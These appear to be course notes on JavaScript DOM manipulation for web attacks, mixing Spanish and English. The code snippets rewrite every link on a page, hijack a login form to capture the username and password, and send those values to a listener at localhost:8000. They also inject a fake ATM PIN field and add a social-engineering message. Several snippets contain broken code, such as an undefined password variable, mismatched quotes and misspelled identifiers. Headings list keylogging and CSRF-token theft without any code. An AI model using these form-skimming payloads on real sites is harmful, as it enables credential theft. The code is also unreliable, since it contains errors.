#### CallBack
> Recibir como parámetro a una función  
> Es una forma de asegurarnos de q un determinando codigo no se ejecuta hasta que otro codigo haya terminado de ejecutarse

### 1. Modificar HTML
**getElementsByTagName()** acepta un nombre de etiqueta y devuelve una colección HTML en vivo de elementos con el nombre de etiqueta coincidente en el orden en que aparecen en el documento.

```
document.getElementsByTagName("button")[0].innerHTML="JAVASCRIPT";
document.getElementsByTagName("h1")[0].innerHTML="Found";
```

### 2. Modificar los links
```
var links = document.getElementsByTagName("a");
for  (i=0; i<links.length; i++){
  links[i].href = "http://debiantano.github.io";
  links[i].innerHTML = "Link Modificado";
}
```

### 3. Hijack form submit
```
function InterceptForm(){
  var username = document.forms[0].elements[0].value;
  var username = document.forms[0].elements[1].value;
  alert(username + ' : ' + password);
}
document.forms[0].onsubmit = InterceptForm;
```

```
> python -m SimpleHTTPServer 8000
function InterceptForm(){
  var username = document.forms[0].elements[0].value;
  var username = document.forms[0].elements[1].value;
  new Image().src = "http://localhost:8000/?username=' + username + "&password=" + password;
}
document.forms[0].onsubmit = InterceptForm;
```

### 4. Modify form fields
```
var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var provius = document.forms[0].elements[0];

document.forms[0].insertBefore(input, previous);
docuemnt.forms[0].action = "http://localhost:8000/"
```

### 5. Ingenieria social
```
var input = document.createElement("h2");
input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
document.forms[0].parentNode.appendChild(input)
```

```
var input = document.createElement("h2");
input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
document.forms[0].parentNode.appendChild(input)
document.forms[0].parentNode.appendChild(document.forms[0)
```


### 6. Capture all clicks
### 7. Keystroke logging
### 8. Event listener
### 9. Include external
### 10. Include external js using
### 11. Solution replace banner
### 12. Solution Stealing from autocomplete
### 13. Posting with xmlHTTPrequest
### 14. Fetching data with xmlHTTPrequest
### 15. Data exfiltration with xmlHTTPrequest
### 16. Extraching CSRF tokens
### 17. CSRF token stealing
### 18. HTML parsing of xmlHTTPrequest response
### 19. Solution multilevel html parsing
### 20. Solution multilevel js parsing
### 21. Solution multilevel xml parsing

